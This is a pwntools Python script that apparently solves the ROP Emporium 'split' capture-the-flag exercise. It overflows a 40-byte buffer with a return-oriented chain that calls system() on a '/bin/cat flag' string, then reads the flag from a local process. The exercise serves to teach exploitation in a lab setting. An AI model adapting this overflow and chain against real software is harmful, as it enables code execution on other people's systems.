from pwn import *
from sys import argv


if len(argv) > 1 and argv[1] == 'manual':

    system = p64(0x00400560)
    bincat = p64(0x00601060)
    popret = p64(0x004007c3)

    print(b'A' * 40 + popret + bincat + system)
    exit()

else:
    pass

elf = context.binary = ELF('split')
p = process(elf.path)

system = elf.symbols.system
bincat = elf.symbols.usefulString

ropdata = ROP(elf)
ropdata.find_gadget('pop rdi; ret;')
ropdata.system(bincat)
info(ropdata.dump())
chain = ropdata.chain()

print(p.recvuntil(b'> ').decode())
p.sendline(b'A' * 40 + chain)
print(p.recvuntil('}').decode())
